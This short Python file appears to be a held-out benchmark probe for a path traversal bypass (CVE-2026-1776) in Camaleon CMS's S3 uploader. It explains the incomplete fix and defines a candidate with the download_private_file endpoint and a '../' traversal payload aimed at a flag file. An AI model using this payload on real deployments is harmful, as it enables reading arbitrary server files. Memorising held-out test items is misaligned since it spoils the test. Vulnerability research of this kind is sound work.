#!/usr/bin/env python3
"""[HELD OUT] Residual CVE-2026-1776 path traversal — the incomplete-fix bypass.

CVE-2024-46987's fix (2.8.1) added a `..` guard ONLY to CamaleonCmsLocalUploader#fetch_file.
The AWS/S3 backend CamaleonCmsAwsUploader#fetch_file was left UNGUARDED:

    def fetch_file(file_name)
      return file_name if file_exists?(file_name)        # File.exist? -> LOCAL fs, resolves ../
      return file_name if bucket.object(file_name).download_file(file_name) && file_exists?(file_name)
      { error: 'File not found' }
    end

So on a deployment whose media storage is the S3 backend (filesystem_type='s3'), the SAME
`../` traversal through download_private_file still reaches an arbitrary LOCAL file via the
File.exist?/send_file path — the residual. Fixed in 2.9.2 (PR #1127 / commit f54a77e):
AwsUploader#fetch_file gains `return {error} unless valid_folder_path?(file_name)` (plus the
2.9.2 controller adds verify_media_authorization + sanitize_private_filename!).

Identical payload to the seed; only the storage BACKEND differs — that is the whole mechanism.
Reaches the flag on V1 (2.8.1, S3 backend); blocked on V2 (2.9.2).
"""
from __future__ import annotations

TRAVERSAL = "../../../../../../pcb_flag.txt"


def candidate() -> dict:
    return {
        "probe_id": "cve-2026-1776-s3-backend-traversal",
        "backend": "s3",
        "endpoint": "/admin/media/download_private_file",
        "param": "file",
        "payload": TRAVERSAL,
    }
